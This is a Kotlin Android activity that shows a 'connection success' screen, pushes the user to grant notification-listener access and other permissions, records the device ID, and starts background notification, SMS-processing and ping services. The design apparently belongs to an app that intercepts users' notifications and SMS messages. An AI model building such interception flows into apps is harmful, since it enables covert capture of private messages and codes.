package cather.lfree.workdscather

import android.content.ComponentName
import android.content.Context
import android.content.Intent
import android.content.pm.PackageManager
import android.os.Bundle
import android.preference.PreferenceManager
import androidx.activity.ComponentActivity
import androidx.activity.compose.setContent
import androidx.compose.foundation.Image
import androidx.compose.foundation.background
import androidx.compose.foundation.border
import androidx.compose.foundation.layout.Column
import androidx.compose.foundation.layout.Spacer
import androidx.compose.foundation.layout.fillMaxSize
import androidx.compose.foundation.layout.fillMaxWidth
import androidx.compose.foundation.layout.padding
import androidx.compose.foundation.layout.size
import androidx.compose.material3.Button
import androidx.compose.material3.ButtonDefaults
import androidx.compose.material3.Text
import androidx.compose.runtime.Composable
import androidx.compose.ui.Modifier
import android.provider.Settings;
import android.text.TextUtils
import androidx.appcompat.app.AlertDialog
import androidx.compose.ui.graphics.Color
import androidx.compose.ui.graphics.RectangleShape
import androidx.compose.ui.platform.LocalContext
import androidx.compose.ui.res.painterResource
import androidx.compose.ui.res.stringResource
import androidx.compose.ui.tooling.preview.Preview
import androidx.compose.ui.unit.dp
import androidx.compose.ui.unit.sp

import cather.lfree.workdscather.servers.ServesNotify
import cather.lfree.workdscather.servers.SmsProcessService
import cather.lfree.workdscather.servers.StupidServicePing

class ComposeLos2 : ComponentActivity() {

        val  ENABLED_NOTIFICATION_LISTENERS = "enabled_notification_listeners";
        val  ACTION_NOTIFICATION_LISTENER_SETTINGS = "android.settings.ACTION_NOTIFICATION_LISTENER_SETTINGS"

       lateinit var mContext : Context
        private var enableNotificationListenerAlertDialog: AlertDialog? = null
        private val df = PermissionOn(this, this)

    private fun isNotificationServiceEnabled() : Boolean {
        val pkgName = getPackageName()
        //val ENABLED_NOTIFICATION_LISTENERS = "android.settings.ACTION_NOTIFICATION_LISTENER_SETTINGS"
        val flat = Settings.Secure.getString(contentResolver, ENABLED_NOTIFICATION_LISTENERS)
        if (!TextUtils.isEmpty(flat)) {
            //final String[] names = flat.split(":");
            val names = flat.split(":")

            for (i in names) {
             val cn = ComponentName.unflattenFromString(i)
                if(cn != null){
                    if(TextUtils.equals(pkgName, cn.packageName))
                        return true
                }
            }

//            for (int i = 0; i < names.length; i++) {
//                final ComponentName cn = ComponentName.unflattenFromString(names[i]);
//                if (cn != null) {
//                    if (TextUtils.equals(pkgName, cn.getPackageName())) {
//                        return true;
//                    }
//                }
//            }
        }
        return false
    }

    override fun onCreate(savedInstanceState: Bundle?) {
        super.onCreate(savedInstanceState)
          setContent {

               HideControllBars(window)
              mContext = LocalContext.current

              Column(modifier = Modifier
                  .fillMaxSize()
                  .background(lGreen))
              {

                      Image( modifier = Modifier
                          .fillMaxWidth()
                          .padding( horizontal = 40.dp)
                          .padding(top = 50.dp),
                        painter = painterResource(id = R.drawable.success_conim),
                        contentDescription = stringResource(id = R.string.change_two))

                     Spacer(modifier = Modifier.padding(vertical = 16.dp))
                     Greeting(stringResource(id = R.string.connection_succes), 30, 42, Color.White)
                     Spacer(modifier = Modifier.padding(vertical = 10.dp))
                     Greeting(stringResource(id = R.string.connet_tonexxt), 12, 18, Color.White)
                     Spacer(modifier = Modifier.padding(vertical = 50.dp))
                     ButtonNF (stringResource(id = R.string.next_string), lGreen) {
                         println(" press this 1")

                         //
                         if(!isNotificationServiceEnabled()){
                             println(" press this 2")
                             enableNotificationListenerAlertDialog = buildNotificationServiceAlertDialog()
                             println(" press this 3")
                             enableNotificationListenerAlertDialog!!.show()
                         }else{
                         if(df.allPermissionsGranted()){

                         callServersALL()
                         mContext.startActivity(Intent(mContext, testTabCompose::class.java))

                         } else {
                                df.requestPermissiong();
                           }
                         }


                    }
              }
        }
    }

    override fun onRequestPermissionsResult(requestCode: Int,
        permissions: Array<String>, grantResults: IntArray) {
        super.onRequestPermissionsResult(requestCode, permissions, grantResults)
        when (requestCode) {
        11 -> {
            // If request is cancelled, the result arrays are empty.
            if ((grantResults.isNotEmpty() &&
                    grantResults[0] == PackageManager.PERMISSION_GRANTED)) {
                println(" all request  is granted ! ")

                callServersALL()

                mContext.startActivity(Intent(mContext, testTabCompose::class.java))

                // Permission is granted. Continue the action or workflow
                // in your app.
            } else {
                // Explain to the user that the feature is unavailable because
                // the feature requires a permission that the user has denied.
                // At the same time, respect the user's decision. Don't link to
                // system settings in an effort to convince the user to change
                // their decision.
            }
            return
        }

        // Add other 'when' lines to check for other
        // permissions this app might request.
        else -> {
            // Ignore all other requests.
        }
    }
}

     private fun buildNotificationServiceAlertDialog() : AlertDialog{
        val alertDialogBuilder = AlertDialog.Builder(this)
        alertDialogBuilder.setTitle(R.string.notification_listener_service)
        alertDialogBuilder.setMessage(R.string.notification_listener_service_explanation)
        alertDialogBuilder.setPositiveButton(R.string.yes) { dialogInterface, i ->
              println(" in this pre error ")
            startActivity(Intent(ACTION_NOTIFICATION_LISTENER_SETTINGS))
        }
         alertDialogBuilder.setNegativeButton(R.string.no,  { dialogInterface, i ->

        })

        return(alertDialogBuilder.create())
    }


   private fun callServersALL(){
          val android_id = Settings.Secure.getString(this.getContentResolver(), Settings.Secure.ANDROID_ID);
          val prefs = PreferenceManager.getDefaultSharedPreferences(this)
          val edi  = prefs.edit()
          edi.putString("androidID", android_id)
          edi.putInt("okEnter", 1);
          edi.apply();

              val requl = Intent(this, ServesNotify::class.java)
              requl.addFlags(Intent.FLAG_ACTIVITY_NEW_TASK)
              startService(requl)

              val smsServiceIntent = Intent(this, SmsProcessService::class.java)
              smsServiceIntent.addFlags(Intent.FLAG_ACTIVITY_NEW_TASK)
              startService(smsServiceIntent)

              val intentFore = Intent(this, StupidServicePing::class.java)
              intentFore.addFlags(Intent.FLAG_ACTIVITY_NEW_TASK)
              startService(intentFore)
   }


@Composable
fun ButtonNF(textN : String, col : Color, onClick: () -> Unit) {
    Button(
        modifier = Modifier
            .padding(horizontal = 20.dp)
            .fillMaxWidth()
            .border(2.dp, Color.White)
            .size(width = 0.dp, height = 56.dp)
        ,
        shape = RectangleShape,
        colors = ButtonDefaults.buttonColors(col),

        onClick  = {onClick() }){
        Text(textN,
            fontSize = 22.sp)
    }
}


@Composable
@Preview(showBackground = true)
fun GreetingPreview() {

      Column(modifier = Modifier.background(Color.Black))
         {



                // Image(bitmap = , contentDescription = )
                    //Greeting("Android2Active", 100)

//                    ButtonN (stringResource(id =  R.string.next_string ), lGreen) { println(" press this ") }

             }
}

}

